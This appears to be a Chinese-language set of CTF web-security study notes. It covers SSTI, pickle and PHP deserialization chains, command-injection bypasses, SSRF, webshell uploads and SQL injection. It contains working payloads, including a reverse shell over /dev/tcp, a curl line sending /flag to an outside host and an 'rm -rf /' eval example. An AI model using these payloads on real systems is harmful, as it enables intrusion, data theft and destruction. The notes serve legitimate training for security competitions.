# WEB


寻找文件：`/tmp`，`env`，`/etc/passwd`

找文件名：`find / -name "*flag*.txt"`

## 工具

### HackBar

```c
devtools
X-Forwarded-For: 127.0.0.1 // 只允许本机登录
// 识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址
User Agent: // 向服务器发出请求的客户端软件
Referer: // 链接到当前请求页面的前一个网页的URL
Cookie: xx=xx // 有时根据提示输入
```

**Post data**

```bash
xx=xx&xx=xx
```



### Burpsuite

Intruder模块：可以多线程对URL或data中的参数进行**爆破**

数据包结尾空2行

### dig

用于从域名系统（DNS）服务器中收集信息，在线网站：`https://tool.lu/dns/index.html`

### 扫描工具

- 扫描web目录，扫描目标：git泄露、源代码泄露

**dirsearch**

```bash
python3 dirsearch.py -u http://xx.com:xx -x 403,301,302,429 -t 10 # 忽略403,301,302,429
-e php # 选择扫描
```

**dirmap**

```bash
python3 dirmap.py -i http://target -lcf # 单目标
```

### GitHack

- `.git`泄露利用，重建还原源代码

```bash
python3 GitHack.py http://xxx/.git/ # 会在目录下得到源代码
```



## Linux

**远程命令绕过**

```bash
ping x:x:x:x ; ls
ping xxx | ls
```

**敏感文件**

```c
/etc/passwd
/etc/shadow
/etc/hosts
/proc/net/arp //arp表，可以获得内网其他机器的地址
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
```

**%00截断**

操作系统层漏洞，OS由C语言编写，以`\0`作为字符串结尾，修改数据包插入`\0`达成截断，可绕过软 WAF 白名单限制



## Python

### 基础知识

```Python
for index, num in enumerate(num_list): # num_list = [xx, xx]
    xxx # 可以获取索引和内容
secure_filename(file_name) # 清理文件名，去除潜在恶意字符
files.seek(0) # 重置文件指针到开头
timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S') # 格式化输出时间
uuid.uuid4() # 通用唯一标识符（Universally Unique Identifier）
os.environ # 查看系统环境变量
```

**排列组合**

```python
from itertools import permutations
flag = ["a", "b", "c"]
item = permutations(flag)
```

**图片处理**

```Python
mimetypes.guess_type(file_path)[0] # 根据文件路径扩展名推断MIME类型
with Image.open(file_path) as img: # 图片打开 返回img对象
    mime = img.get_format_mimetype() # 获取MIME类型
```

**类**

```Python
def __repr__(self) -> str: # 重写自我描述信息, print时打印内容
    return f"xxx"
```

**Flask**

```Python
app = Flask(__name__, template_folder='another') # 初始化flask应用 
# 默认html模版文件在templates文件夹中, 此处指定为another
app.config['some'] = xxx # 配置
app.run(host='0.0.0.0', port=5000) # 启动应用

@app.route('/hello', methods=['POST']) # 设置路由及函数
def func():
    if xx not in request.files: # files是字典
        return '错误信息', 400 # 状态码
    return redirect(url_for('index')) # 重定向到主页
    return render_template("index.html", id = "xx") # 返回模版及id参数
    
request.method # "POST"
request.files.get('key', None) # 字典找键, 未找到返回None
```

**Jinja2-模板引擎**

```Python
# 自定义模板加载
env = Environment(loader=FileSystemLoader('static'), autoescape=True)
# 加载方式: FileSystemLoader 从 static 文件夹中加载模板文件".html"等
# autoescape=True 安全机制:  XML/HTML 自动转义特殊字符防止XSS攻击

# 重定义 渲染函数
def render_template(template_name, **context): # context是关键字参数, 如name="Alice", age=30
    template = env.get_template(template_name) # 加载模板
    return template.render(**context) #  context 字典渲染模板
```

### Debug命令执行

- Flask框架，已知`PIN`码的情况下，访问`http://xxx.xxx/console`进入控制台输入`PIN`码进行RCE
- debug模式开启，报错会泄露源码及后台路径

```Python
import os
os.chdir('path') # 切换目录
os.remove(file) # 删除文件
os.rmdir(directory) # 删除目录
os.makedirs('xx', exist_ok=True) # 创建目录 目标已存在不会抛出异常
os.path.exists('x') # 判断目录是否存在
for path, dirs, files in os.walk(folder, topdown=False): # 分别返回目录路径, 当前目录所有子目录名, 当前目录所有文件名, 从下到上遍历
file_save_path = os.path.join(folder, file) # 构建文件保存路径
file.save(file_save_path) # 文件保存在路径中
os.path.relpath(file_path, folder]) # 将文件绝对路径替换为关于folder的相对路径
# debug终端下, 直接输入os.system('xx')只会返回0, 表示成功
import subprocess

# 命令列表形式传入
result = subprocess.run(['cat', 'flag'], 
            stdout=subprocess.PIPE,  # 捕获标准输出
            stderr=subprocess.PIPE)  # 捕获标准错误
print(result.stdout.decode())  # 显示 cat flag 命令输出
```

### SSTI模板注入

- flask框架，Server-Side Template Injection，服务端模板注入

#### Jinja2

3种语法

```jinja2
{% %} {# 控制结构 #}
{{ }} {# 变量取值 #}
```

内置函数及属性

```python
__class__ # 调用的参数类型
__bases__ # 基类列表
__subclasses__() # 子类列表
__globals__ # 字典形式返回函数所在全局命名空间所定义的全局变量
__builtins__ # 内建模块引用
```

**漏洞点**

```Python
# {{id | safe}} 中 safe 表示值直接插入到HTML中, 不做任何转义, 可造成SSTI攻击
evil = content.replace('{{id | safe}}', id) # 将模板内容中的{{id | safe}}替换为id
return render_template_string(evil) # 将替换后的字符串作为Jinja2模板渲染
```

测试是否是SSTI：`{{7 * 7}}` 是否返回 `49`或`{{7+7}}`是否返回`14`

**os模块执行命令**

```Python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
# 配置对象 > 类 > 初始化构造函数 > 全局命名空间 > os.popen('whoami').read() 执行命令
```

**列举目录**

```jinja2
{# 列举目录 #}
{{ c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/') }}
```

**绕沙箱读取服务器代码**

```jinja2
{# 空列表[] > list类 > 基类object > 所有object子类 #}
{% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}
   {% endif %}
{% endfor %}

{# payload #}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

#### 绕过

- 有黑名单过滤

**字符串拼接**

```jinja2
'o'+'s'
'__imp'+'ort__'
'/fl'+'ag'
```



### 反序列化漏洞

**Pickel序列化及反序列化**

```Python
class Pet:
    def __init__(self, name, species) -> None:
        self.name = name
        self.species = species

pet = Pet(name, species)

# 序列化
serialized_pet = base64.b64encode(pickle.dumps(pet)).decode("utf-8")

# 反序列化
pet_data = base64.b64decode(serialized_pet)
pet = pickle.loads(pet_data)
```

RCE payload构造

```Python
class exp:
    # # __reduce__() 序列化时返回一个元组(可调用函数和参数元组)，反序列化时参数传递调用该函数
    def __reduce__(self): 
        return (os.system, ("whoami",))

malicious_payload = pickle.dumps(exp())
encoded_payload = base64.b64encode(malicious_payload).decode('utf-8')
```

无回显时考虑替换全局变量，在网页中的某变量中显示信息

```Python
class exp:
    def __reduce__(self):
        return (exec, ('import os; global store; store = os.environ["FLAG"]',))
# python在局部改变全局变量时需要声明 global
```

**过滤**

```python
pickle_data = base64.b64decode(data)
for i in {"os","system","eval","setstate","globals",'exec','__builtins__','template', 'render','\\','compile','requests','exit','pickle',"class","mro","flask","sys","base","init","config","session"}:
```

**利用subprocess**

```python
return (subprocess.check_output, (["cp", "/flag", "/app/app.py"],)) # 直接返回命令的标准输出
return (subprocess.run, (["bash", "-c", "bash -i >& /dev/tcp/$ip/$port 0>&1"],)) # 反弹shell
```



### 文件包含漏洞

```Plain
# 直接访问服务器内部某端口文件
http://xxx/image?url=http://localhost:5728/image/flag.jpg 
```

### 爬虫

**网页请求**

**网页请求**

```Python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json'
}

proxies = { # 代理查看http包
    'http': 'http://127.0.0.1:8080',
    # 'https': 'https://https_proxy:port'
}

data = {
    "arg1":"val1",
    "arg2": "val2",
    "arg3": f"{a_variable}"
}

# get
response = requests.get("https://url", headers=headers, cookies=cookies)
# post
response = requests.post("http://127.0.0.1:32585", headers=headers, json=data, proxies=proxies) # json形式上传
response = requests.post("http://127.0.0.1:32585", headers=headers, data=data, proxies=proxies) # xx=xx&xx=xx形式上传

cookies = response.cookies # 获取cookies
if response.status_code == 200:
    print(response.text)
    print(cookies.get_dict())
else:
    print(f"状态码: {response.status_code}")
```

**爬虫匹配**

```Python
from bs4 import BeautifulSoup

soup = BeautifulSoup(html_content, 'html.parser')
h1_tag = soup.find('h1', id='status')  # <h1 id="status">

if h1_tag:
    status_text = h1_tag.get_text(strip=True) # 获取标签内容并去除多余空白
    print(status_text)
```

### 路径遍历漏洞

```PHP
xxx.com?path=../../../../../../../../etc/passwd
```

## PHP

环境搭建，在PHPSTUDY中的**WWW**界面下放入文件夹及代码即可

### 基础知识

php版本7.3.22爬虫，首先检查`robots.txt(表示网站不希望哪些页面被爬取), source.txt`

- 隐藏源码：`x.php.swp`
- 变量覆盖可以窃取信息

一些**基础代码**

```PHP
<?php

error_reporting(0); // 关闭所有错误报告
session_start(); // 允许脚本访问和修改用户的会话数据
ob_start(); // 开启输出缓冲，不从脚本发送任何输出

include("file.file"); // 此文件包含file.file所有变量范围 
include_once "xx.php"; // 指定文件载入并执行其中程序，若文件已被包含则不再包含

highlight_file("xx.php"); // 将PHP代码高亮显示在网页
isset() // 判断一个变量是否已被设置, 且不为 null

$arr=array($x, "1"); // 数组[ $x, "1" ]
$$x = $y; // $x="user", $y="admin", 则 $user = "admin"

strpos($content, $string); // 返回string在content第一次出现的索引, 否则返回false
trim(addslashes($v)); // 去除首尾空白字符, 对", ', \, NULL添加反斜杠

// PHP 数组或对象编码为 JSON 格式的字符串
echo json_encode(array('status' => 0, 'info' => 'hello'));

putenv("{$k}={$v}"); // 定义环境变量
# url传参: ?env[xxx]=`xxx`

unset($arr); // 清除变量

system("bash -c 'ls'"); // 命令执行

die('FAIL'); // 终止程序并输出
exit($hh); // 会输出$hh变量值
exit; // 终止脚本执行

// 终端 php xx.php 执行
```

**http**

```PHP
// a变量值
$_POST['a']; // post请求 若为数组某值构造 : a[xxx]=xxx
$_GET['a'];  // get请求
// 循环处理
foreach ($_POST as $k=>$v); // $k键, $v值

// 黑名单
$BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
if(preg_match("/{$BlackList}/is",$post['query'])){}; // s使.可匹配换行符\n防止换行绕过关键字过滤

preg_match('/flag/', $_GET['a'])// 检查是否存在匹配 flag 的子串
// /flag/i   i 忽略大小写匹配, 即FlaG也会匹配
@preg_match("/^[a-zA-Z0-9]+\.$/", $b)
// [a-zA-Z0-9]+   [x]: 表示匹配其中任何一个字符  +: 匹配前面一次或多次
// \.: 匹配 .  因为只有 . 是匹配任何字符, 此处转义 {6}:至少重复6次，可不连续
// @表示隐藏报错 ^$锚定开头和结尾


header('Content-Type: ' . $mime_type); // 设置指定 HTTP 响应头
```

**网络编程**

```PHP
$ch = curl_init(); // 初始化 cURL 会话句柄

// 设置 cURL 选项
curl_setopt($ch, CURLOPT_URL, $url);             // 请求的url
curl_setopt($ch, CURLOPT_HEADER, false);         // 不获取响应头
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // 返回响应内容,不直接输出到控制台
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // 自动跟随重定向 URL
    
$res = curl_exec($ch); // 执行 cURL 请求
curl_close($ch);
```

**图片处理**

```PHP
$image_info = getimagesizefromstring($res); // 解析二进制数据, 获取图片信息
// 返回7值数组: [宽度][高度][图像类型常数之一][height="yyy" width="xxx"][bits:每种颜色的位数][MIME 类型]
$mime_type = $image_info['mime'];
```

**文件读写**

```PHP
$content = file_get_contents("filename.txt");
file_put_contents("filename.txt", "New content");
```

### PHP伪协议

URL格式：`scheme://user:password@address:port/path?query#fragment`

**data://**

PHP>=5.2.0，可使用`data://`数据流封装器传递数据

```PHP
$a = $_POST['a'];
if (file_get_contents($pen) !== 'hello')
data://text/plain,hello        读取出 'hello'
data://text/plain;base64,xx    xx Base64 解码后读出内容
```

**php://filter**   读取源代码并进行base64编码输出

```PHP
include($a);
?a=php://filter/read=convert.base64-encode/resource=flag.php
```

### 命令执行

Linux下命令：

- ls替代：`dir`
- 空格绕过：`<`, `${IFS}`, `$IFS$9`, `%09`, `<>`, `<`, `%20`, `$IFS`
- cat命令替代：`more`, `tail`, `head`, `less`, `nl`, `sort`, `tailf`
- 截断字符替代：`&&`, `||`, `;`, `%0a`, `|`
- 反斜杠绕过：`ca\t fl\ag.txt`
- 编码绕过：`echo 'a==' | base64 -d`
- 单双引号绕过：`c'a't`, `c"a"t`
- 通配符绕过：`f?ag`, `f*`, `f[a-z]ag`, `f{l,b}ag`

```php
shell_exec("nslookup " . $domain);
// &quot;为"的html形式
```

若匹配flag，查看目录下文件内容

```bash
cat `ls` 
```

**环境变量注入实现命令执行**

- `BASH_ENV`：可以在`bash -c`的时候注入任意命令

```bash
BASH_ENV='$(id 1>&2)' bash -c 'echo hello' # 将输入id以及hello
```

注入时对命令中字母进行编码绕过可在Linux下执行

```bash
# cat flag 字母转换: oct(ord('c'))[2:]
# 每个字节前加上$
$'\143'$'\141'$'\164' $'\146'$'\154'$'\141'$'\147'
```

**反弹shell命令**

- 使用花生壳，内网为kali地址及端口，外部为某域名
- kali中`nc -lnvp 5555`即可

```bash
cat /flag | curl -d @- https://xx.xx.xx.xx:port # @-表示从标准输入读取, -d指定发送数据
```



### 远程命令执行

RCE，Remote Command Execution

```PHP
eval($_POST['what']);
```

**利用**

```PHP
what=<?php system('rm -rf /'); ?> // 删除系统所有文件
what=echo getcwd(); // 查看当前目录
what=print_r(scandir(getcwd())); // 查看当前目录所有文件和目录
what=print_r(scandir('../'));    // 查看上一目录所有文件和目录
what=echo file_get_contents('filename.txt'); // 查看文件内容
```

**无参函数RCE** 

```PHP
if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\/|zip:\/\//i', $cmd))
// 禁用协议
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $cmd))
// 只能为无参函数嵌套形式: func(fun(h()));
if (!preg_match('/pwd|tac|cat|chr|ord|ls|dir|conv|info|hex|bin|rand|array|source|file|cwd|dfined|system|assert|sess/i',$cmd))
// 黑名单过滤cmd

@eval($cmd);
```

`getallheaders()`绕过----返回当前请求的所有请求头信息（限Apache）

`var_dump(end(getallheaders()));`测试是否可以获取到返回信息

```PHP
?cmd=eval(end(getallheaders())); // url

// 及在burp数据包下最后一行加入以下任何一个进行命令执行
sky: phpinfo();
sky: system("ls");
```

### 常见绕过

**MD5绕过**

- MD5 碰撞：两个不同的字符串 MD5 哈希值相等


**php弱类型比较: 构造md5值为0e开头的科学计数法**

```PHP
if ($name != $password && md5($name) == md5($password))
```

payload：

```Plain
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
```

**php强类型比较: 构造数组**

```PHP
if ($name !== $password && md5($name) === md5($password))
// 0e字符串无法绕过 而 md5 函数传入数组的返回值都是NULL
```

payload：

```Plain
url: password[]=2&name[]=1
```

**MD5哈希爆破**

```python
from hashlib import md5
for i in range(10000000):
    if md5(str(i).encode('utf-8')).hexdigest() == 'xxxx':
        print(i)
```

**字符绕过**

```PHP
if (!is_numeric($a) && !is_numeric($b)) { // a和b不是数值
    if ($a == 0 && md5($a) == $b[$a]){}
} // 可以通过 a = false = 0

if($a > 99) // a = 100abc也可通过且可绕过in_numeric
```

**哈希函数绕过**

```php
hash_hmac('sha256', $a, $b); // $a为数组时，加密结果固定为NULL
```



### 反序列化漏洞

**序列化**

- 序列化：对象转换为字节序列，为保存对象方便重用
- 反序列化：字节序列恢复为对象

```PHP
$c = serialize($arr);
$a = unserialize($_GET['data']); // 已序列化的字符串还原为PHP的原始数据类型或对象
```

**序列化格式**

```PHP
O:4:"Test":2:{s:1:"a";s:5:"Hello";s:1:"b";i:20;}
对象类型:长度:"名字":类中变量的个数:{类型:长度:"名字";类型:长度:"值";......}
```

**类型字母**

```PHP
a - array                  b - boolean  
d - double                 i - integer
o - common object          r - reference
s - string                 C - custom object
O - class                  N - null
R - pointer reference      U - unicode string
```

**魔术方法**

当这些方法在某个类test中，如只有在test类中含有__invoke，某函数将对象当作函数调用触发才成功

```PHP
public function __construct(){} // 构造函数 new一个类实例对象时调用
public function __destruct(){} // 析构函数 某对象的所有引用都被删除或对象被显式销毁时执行
public function __invoke(){} // 尝试将对象当作函数调用时触发
public function __set($a, $b){} // 魔术方法: 尝试给一个不存在或不可访问的属性赋值时被调用
// $a: 属性名 $b: 值
public function __toString(){} // 当对象被当作字符串使用时调用 比如 echo一个对象
public function __wakeup(){}   // 序列化字符串被反序列化时调佣
public function __sleep(){}    // 对象被序列化时调用
```

**对象注入漏洞**

操作序列化的对象来执行任意代码

**两**个条件：

- 必须具有一个实现PHP魔术方法的类
- 攻击中使用的所有类都必须在调用易受攻击的`unserialize()`时声明

**代码构造出序列化串**

```php
<?php
class Name{
	private $user = 'admin'; // 私有字段名在序列化时，类名及字段名前会加入\0
}
$test = new Name;
print(serialize($test)); 
// O:4:"Name":1:{s:10:"Nameuser";s:5:"admin";}
// 构造更新: O:4:"Name":1:{s:10:"%00Name%user";s:5:"admin";}
```



**绕过**

- 属性个数的值大于实际属性个数时，会跳过 `__wakeup()` 函数执行

**例题——moectf2024【pop moe】**

```PHP
<?php
class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data'])){
    $a = unserialize($_GET['data']);
}
```

构造链的过程：

`__destruct()` > `check()`【payl0ad为1】 > 【what为class001】对象作为函数调用 > `__invoke()` > 【payl0ad为dangerous, a为class001】为不存在的payload赋值 > `__set(payload, dangerous)` > `dangerous(this->sec)` > 【sec为class003, 作为whaattt执行->evvval(class003)】 > 对象作为字符串 > `__toString()`返回mystr【mystr为执行的命令】 > `eval(mystr)`

最终构造的`data`展开：

```PHP
O:8:"class000":2:{
    s:7:"payl0ad";i:1;
    s:4:"what";O:8:"class001":2:{
        s:7:"payl0ad";s:9:"dangerous";
        s:1:"a";O:8:"class002":1:{
            s:3:"sec";O:8:"class003":1:{
                s:5:"mystr";s:10:"phpinfo();";
            };
        };
    };
}
```

假设没有eval函数的情况，使用`system(ls)`命令进行RCE

**字符注入**

`mb_strpos`与`mb_substr`连用导致字符注入

```PHP
function substrstr($data){
    $start = mb_strpos($data, "["); // 字符 "[" 首次出现的索引, 否则false
    $end = mb_strpos($data, "]");
    
    return mb_substr($data, $start, $end + 1 - $start);// 多字节字符集的子字符串提取
}   // '[' 开始 ']' 结束的所有字符

$key = substrstr($_GET[0]."[helloJshirobro]"); // 注入点
echo $key
// ?0=%9f              start=0, end=6, key=?[hello ?是字符乱码
// ?0=%f0              start=1, end=7, key=llo]
// ?0=%9f%9f%9f%9fabcd start=4, end=10, key=abcd[he
// ?0=%f0abc%9f        start=4, end=10, key=ello] 效果类似右移(3-1)位
// %f0abc%0abc%9f:效果为右移(2*3-1)位
```

**任意字符串构造**

- **`%9f`不解析，造成字符串后移一位：%9f数量等于要构造的字符串长度`%9f%9fab`**
- `%f0`吞掉字符串三位: %f0加随便三个字符，结合`%9f`的后移，`%f0abc%9f`达到字符串逃逸

注：`substrtr`函数逃逸出的字符不能大于原来的字符数量，此时可通过其他`GET`传入增加字符数量

payload构造：

```PHP
?get1=(增加字符数量, 任意值)&read=(n个%9f)(序列化字符串)
```

**增长字符逃逸**

```PHP
function filter($str){
    return str_replace('bb', 'ccc', $str); // n个bb将会多n个字符
}

class A{
    public $name='aaaabb';
    public $pass='123456';
}

$AA=new A();
echo serialize($AA)."\n"; 
// O:1:"A":2:{s:4:"name";s:6:"aaaabb";s:4:"pass";s:6:"123456";} 
echo filter(serialize($AA));
// O:1:"A":2:{s:4:"name";s:6:"aaaaccc";s:4:"pass";s:6:"123456";}
// s 多一个字符, 但只能解析6个, 逃逸了一个c
```

通过逃逸修改pass，payload为25个字符，即前加入25个'bb'，每个逃逸一个字符

```PHP
$name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:4:"hack";}'
//$name: ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
//$pass: hack       
```

**例题——NepCTF2024【PHP_MASTER!!】**

打入`payload`：URL( 47个%00, 即47个'\0' 增长型字符逃逸)

```PHP
?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}&nep1=%f0123%f0123%f0123%9f%9f%f0123&nep=Nep
// ";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}} 长度为47 增长逃逸47字符
<?php
function substrstr($data){
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start); // 变式
}

class B
{
    public $b;
    public function __tostring(){
        if (preg_match("/\[|\]/i", $_GET['nep'])) {
            die("NONONO!!!");
        }
        $str = substrstr($_GET['nep1'] . "[welcome to" . $_GET['nep'] . "CTF]");
        // 原: %f0123%f0123%f0123%9f%9f%f0123[Welcome toNepCTF]
        // 后: str = NepCTF] 效果:右移3*3个,左移2次,右移3个
        if ($str === 'NepCTF]') {
            return ($this->b)(); // b为phpinfo, 可以执行phpinfo;
        }
    }
}
class C
{
    public $s;
    public $str;
    public function __construct($s){
        $this->s = $s;
    }

    public function __destruct(){
        echo $this->str; // str为对象, 将对象作为字符串输出调用_tostring
    }
}
$ser = serialize(new C($_GET['c']));
// $_GET['c']: ";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}绕过
// $ser: O:1:"C":2:{s:1:"s";s:94:"";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
$data = str_ireplace("\0", "00", $ser); // 不区分大小写 字符串替换
// $data: O:1:"C":2:{s:1:"s";s:94:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
unserialize($data);
```

此时构建的结构为：

```PHP
O:1:"C":2:{
    s:1:"s";s:94:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    s:3:"str";O:1:"B":1:{
        s:1:"b";s:7:"phpinfo";
    }
} ";s:3:"str";N;} 忽略了
```

### SSRF漏洞

**漏洞点**

```PHP
$url = $_GET['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
$res = curl_exec($ch); // 获取指定 URL 内容并输出
```

**特殊文件协议**

```bash
http://target.com/script.php?url=file:///etc/passwd #尝试让服务器本身执行命令
```

### 文件上传漏洞

**文件操作**

```PHP
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $uploadDir = "uploads/"; // 上传目录
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true); // 创建目录
    }

    if (!empty($_FILES['image']['name'])) {
        // $_FILES 超级全局数组, 专用于处理文件上传
        $fileName = basename($_FILES['image']['name']); // 文件名
        
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif']; // 文件验证
        $fileType = $_FILES['image']['type'];
        if (!in_array($fileType, $allowedTypes)) {
            die('Error: Unsupported file type.');
        }

        $maxSize = 2 * 1024 * 1024; // 2MB
        $fileSize = $_FILES['image']['size']; // 文件大小限制
        if ($fileSize > $maxSize) {
            die('Error: File size is too large.');
        }

        // 构建完整文件路径
        $filePath = $uploadDir . $fileName; // . 用于PHP字符串拼接

        // 移动文件到指定目录
        if (move_uploaded_file($fileTmpName, $filePath)) {
            echo "上传图片在：" . $filePath;
        } else {
            echo "上传失败";
        }
    } else {
        echo "无文件上传";
    }
}
```

**过滤**

```php
$ext = pathinfo($file_name, PATHINFO_EXTENSION); // 获取扩展名
if(in_array($ext, ['x','x'])){
	exit('no');
}
```

上传一句话木马到相应目录中，且该目录可通过URL访问，使用蚁剑连接【url为文件地址，密码为post中数据】

`https://www.cnblogs.com/ash-33/p/16397536.html`中有一些一句话木马

**图片木马**

在`cmd`中运行`copy pho.png/b+hello.php/a hack.png`将图片和php木马结合

**文件上传抓包**

将下面`filename`改为`hack.php`即可

```PHP
Content-Type: multipart/form-data; boundary=---------------------------1104904014997412098933705552
Content-Length: 727
DNT: 1
Connection: close
Referer: http://127.0.0.1:40349/
Priority: u=0

-----------------------------1104904014997412098933705552
Content-Disposition: form-data; name="image"; filename="hack.php"
Content-Type: image/png
xxxxxx
-----------------------------1104904014997412098933705552--
```

**php拓展名**

- `.php3`，`.php4`，`.php5`，`.php7`，`.phtml`，`.phps`，`.pht`



### SQL注入漏洞

**MySQL中的注释：**

- `#`，直接加注释内容，有时需要注意可能被解析为页内跳转，所以使用`%23`
- `--`，`--`注释符后需要加一个空格，注释才能生效
- `/* */`，多行注释符
- `-+`，注释变体

**php连接mysql**

```PHP
$pwd = $_POST['pwd'];
$pwd = md5($pwd);
    
$conn = mysqli_connect("主机名", "用户名", "密码", "数据库名", 端口); // 变量填$password
if($conn){
    die("Mysql connect error");
}
// 选择数据库
$selectDB = mysqli_select_db($conn, $dbName);

```

**sql fuzz**：使用`https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt`中的数据结合 burpsuite 进行模糊测试



#### 漏洞点

```php
$sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_array($result);

if ($row) {}
```

此处可使用`payload`：

1. 万能密码型：`admin' or 1 = 1# `
   1. `SELECT * FROM admin WHERE email='a@e.com'OR 1 = 1# AND pwd='$pwd'`
2. 联合型：`b' UNION SELECT * FROM admin WHERE 1 = 1-- `
   1. `SELECT * FROM admin WHERE email='a@e.com' UNION SELECT * FROM admin WHERE 1 = 1-- AND pwd='$pwd'`
3. 万能密码2型：`admin' = ''-- `即 False='' 恒成立
   1. **`SELECT * FROM admin WHERE email='a@e.com' = ''-- AND pwd='$pwd'`**

**拼接**

```php
$sql = "select ".$post['query']."||flag from Flag"; // ||默认为或运算符，未使用预处理语句
mysqli_multi_query($conn, $sql);

do{
    if($res = mysqli_store_result($conn)){ // 获取查询结果
        while($row = mysqli_fetch_row($res)){ // 逐行获取查询结果并打印
            print_r($row);
        }
    }
}while(@mysqli_next_result($conn)); // 支持多条SQL语句执行
```

- 查看数据表Flag所有列内容，且添加一个由列flag的值与1拼接/异或后生成的新列获取flag值，视不同sql而不同

```sql
# *,1
select *,1||flag from Flag;
+----+------+-----------+
| id |  x   | 1 || x    |
+----+------+-----------+
|  1 |  abc | 1||abc    |
|  2 |  xyz | 1||xyz    |
+----+------+-----------+
```

- 修改||为拼接，将返回1flag{xxx}

```sql
# 1;set sql_mode=PIPES_AS_CONCAT;select 1
select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag;
```



**预处理语句**

```php
$stmt = $conn->prepare("SELECT ? FROM Flag");
$stmt->bind_param("s", $post['query']);
$stmt->execute();
```



#### 联合注入

**验证查询返回列**

- union select

```mysql
UNION SELECT 1, 2 # 报错: The used SELECT statements have a different number of columns
UNION SELECT 1, 2, 3 # 一个一个试出原始查询语句返回列数, 成功则1,2,3将填入相应回显字段中
```

- order by
- group by

```sql
group by 3
order by 3 # 更改数字，表示以第几列进行排序
# 报错: Unknown column '3' in 'order clause' 则表示有2列字段数
```

**基础信息**

```sql
version() # 数据库版本信息
database() # 数据库名
```

**爆破全部数据库**

```sql
union select 1,2,group_concat(schema_name) from information_schema.schemata%23
```

**查数据库中表**

```sql
# 在第三个回显中显示数据库表
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # 
# group_concat: 查询结果逗号连接成字符串
# table_name: 是系统数据库information_schema.tables中一个字段
# table_schema: 表所属数据库名称
# database(): 当前连接的数据库名称
```

**对表查列字段**

```sql
union select 1,2,group_concat(column_name)from information_schema.columns where table_name='leak_table_name'
```

**对数据表爆数据**

```sql
union select 1,2,group_concat(leak_column_name1, '-', leak_column_name2) from data_base_table_name # 或 from data_base_name.dtable_name
```

#### 堆叠注入

- 利用 `;` 在原SQL查询后追加新语句（有时需将前语句闭合）

**测试**

```mysql
1; show databases; # 获取数据库
1; show tables; # 查看所有数据表
# 继续查看表x和表123中内容
show columns from x; 
show columns from `123 `; # 需使用反引号
```

**替换**：利用改名，将本不可读取的表数据修改为可读取表中数据

```mysql
rename table t1 to t2; # 将t1表改名
alter table words add id int unsigned not Null auto_increment primary key; # 新表添加新列名:保持一致操作
alter table words change flag data varchar(100); # 改名flag为data
```

#### 二次注入

**漏洞点**

```php
mysql_query("insert into users(username, passwd, info) values ('{$username}', '{$password}', ' ');")
$info = query("select info from users where username='{$_SESSION['username']}';"); // 显示info
```

1中无法回显，通过1中闭合union连接命令，在2中同样执行最终回显

#### 报错注入

- 基于XPAT(XML)报错注入函数（xpath）：`updatexml`对xml文档数据查询及修改，`extractvalue`查询
- 若`XPath_string`不符合格式会以系统报错提示错误，查询字符串长度最大32位，需使用`right(), left(), substr()`截取字符串

**获取用户名，数据库，版本**

